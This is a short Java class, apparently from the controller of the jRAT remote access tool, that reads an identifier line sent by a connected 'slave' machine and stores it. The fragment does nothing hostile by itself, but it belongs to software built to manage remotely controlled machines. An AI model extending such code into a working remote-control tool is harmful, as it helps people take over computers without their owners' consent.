package se.jrat.client.packets.incoming;

import java.io.DataInputStream;

import se.jrat.client.Slave;


public class Packet7InitServerID extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		slave.setID(slave.readLine());
	}
}
